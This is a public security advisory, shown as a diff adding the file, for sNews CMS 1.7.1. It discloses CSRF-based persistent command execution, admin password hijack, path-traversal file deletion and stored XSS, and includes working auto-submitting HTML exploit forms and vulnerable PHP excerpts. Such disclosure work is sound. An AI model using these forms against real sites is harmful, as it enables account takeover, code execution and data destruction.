@@ -1,0 +1,227 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/SNEWS-RCE-CSRF-XSS.txt
+
+[+] ISR: APPARITIONSEC
+
+
+Vendor:
+============
+snewscms.com
+
+
+Product:
+================
+sNews CMS v1.7.1
+
+
+Vulnerability Type:
+===================================
+Persistent Remote Command Execution
+Cross Site Request Forgeries (CSRF)
+Persistent XSS
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+======================
+
+If an authenticated user happens to stumble upon an attackers webpage or
+click an infected link they have a chance to get the following prizes,
+
+1) Persistent Remote Code Execution
+2) Cross Site Request Forgeries
+3) Persistent XSS
+
+
+sNews has feature that allows PHP functions to be inserted for articles by
+authenticated users under "Edit Article". However, there is no
+CSRF token/checks to prevent unauthorized HTTP requests to be made on
+behalf of that user. Furthermore, these commands will get stored in MySQL
+database in the 'articles' table. So each time that sNews webpage is
+visited it will execute.
+
+e.g.
+
+CSRF / RCE Under "Edit Article" Admin area.
+
+[func]system:|:"calc.exe"[/func]
+
+On line no 3270 of "snews.php" there is no input filtering allowing
+arbitrary system calls.
+
+$returned = call_user_func_array($func[0], explode(',',$func[1]));
+
+////////////////////////////////////////////////////////////////////////////////////////////
+
+
+CSRF / Hijack SNews CMS accounts, the username however must be known in
+advance, if known then that lucky user wins a changed password!.
+
+
+////////////////////////////////////////////////////////////////////////////////////////////
+
+
+CSRF / arbitrary file deletion, we can delete arbitrary files in the
+webroot which we can use to bypass access controls like ".htaccess" file.
+allowing attackers to read/access files from those affected directories.
+
+On line 3080 "snews.php" direct usage of untrusted user input into the PHP
+"unlink" function which deletes any files the attacker wants.
+
+if (isset($_GET['task']) == 'delete') {
+$file_to_delete = $_GET['folder'].'/'.$_GET['file'];
+@unlink($file_to_delete);
+echo notification(0,'','snews_files');
+
+
+///////////////////////////////////////////////////////////////////////////////////////////
+
+
+Persistent XSS entry point also exists in same "Edit Article" Admin area,
+but why bother when we have RCE option.
+
+
+Exploit code(s):
+===============
+
+Remote Command Execution pop "calc.exe" POC.
+
+<form id="CSRF_RCE_PRIZE" method="post" action="
+http://localhost/snews1.7.1/?action=process&task=admin_article&id=2">
+<input type="hidden" name="title" value="Remote Command Execution" />
+<input type="hidden" name="seftitle" value="remote-command-execution" />
+<input type="hidden" name="text" value='[func]system:|:"calc.exe"[/func]' />
+<input type="hidden" name="define_category" value="1" />
+<input type="hidden" name="show_on_home" value="on" />
+<input type="hidden" name="publish_article" value="on" />
+<input type="hidden" name="position" value="1" />
+<input type="hidden" name="description_meta" value="" />
+<input type="hidden" name="keywords_meta" value="" />
+<input type="hidden" name="description_meta" value="on" />
+<input type="hidden" name="display_title" value="on" />
+<input type="hidden" name="display_info" value="on" />
+<input type="hidden" name="fposting_day" value="3" />
+<input type="hidden" name="fposting_month" value="6" />
+<input type="hidden" name="fposting_year" value="2016" />
+<input type="hidden" name="fposting_hour" value="6" />
+<input type="hidden" name="fposting_minute" value="16" />
+<input type="hidden" name="task" value="admin_article" />
+<input type="hidden" name="edit_article" value="save" />
+<input type="hidden" name="article_category" value="1" />
+<input type="hidden" name="id" value="2" />
+<script>document.getElementById('CSRF_RCE_PRIZE').submit()</script>
+</form>
+
+
+After we make HTTP request for the booby trapped article and KABOOM.
+
+http://localhost/snews1.7.1/uncategorized/remote-command-execution/
+
+
+CSRF - Account Hijack
+=====================
+
+<form id="CSRF-CHG-PASSWD-PRIZE" method="post" action="
+http://localhost/snews1.7.1/?action=process&task=changeup">
+<input type="hidden" name="uname" value="admin" />
+<input type="hidden" name="pass1" value="PWN3D123" />
+<input type="hidden" name="pass2" value='PWN3D123' />
+<input type="hidden" name="task" value="changeup" />
+<input type="hidden" name="submit_pass" value="Save" />
+<script>document.getElementById('CSRF-CHG-PASSWD-PRIZE').submit()</script>
+</form>
+
+
+CSRF - Arbitrary File Deletion
+===============================
+
+1) Create file in htdocs / web root as a test e.g. "DELETEME.php"
+
+2) Visit following URL as authenticated user.
+
+http://localhost/snews1.7.1/?action=snews_files&task=delete&folder=Patches
+Log&file=../../../DELETEME.php
+
+3) Files gone!
+
+
+
+Persistent XSS
+===============
+
+<form id="XSS" method="post" action="
+http://localhost/snews1.7.1/?action=process&task=admin_article&id=2">
+<input type="hidden" name="title" value="XSS" />
+<input type="hidden" name="seftitle" value="XSS" />
+<input type="hidden" name="text"
+value="[include]<script>alert(document.cookie)</script>[/include]" />
+<input type="hidden" name="define_category" value="1" />
+<input type="hidden" name="show_on_home" value="on" />
+<input type="hidden" name="publish_article" value="on" />
+<input type="hidden" name="position" value="1" />
+<input type="hidden" name="description_meta" value="" />
+<input type="hidden" name="keywords_meta" value="" />
+<input type="hidden" name="description_meta" value="on" />
+<input type="hidden" name="display_title" value="on" />
+<input type="hidden" name="display_info" value="on" />
+<input type="hidden" name="fposting_day" value="3" />
+<input type="hidden" name="fposting_month" value="6" />
+<input type="hidden" name="fposting_year" value="2016" />
+<input type="hidden" name="fposting_hour" value="6" />
+<input type="hidden" name="fposting_minute" value="16" />
+<input type="hidden" name="task" value="admin_article" />
+<input type="hidden" name="edit_article" value="save" />
+<input type="hidden" name="article_category" value="1" />
+<input type="hidden" name="id" value="2" />
+<script>document.getElementById('XSS').submit()</script>
+</form>
+
+
+
+
+Disclosure Timeline:
+=================================
+Vendor Notification:  No Replies
+June 19, 2016  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+================
+Critical
+CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
+
+
+Description:
+================================================
+Request Method(s):        [+]  GET / POST
+
+Vulnerable Product:       [+] snews v1.7.1
+===========================================
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
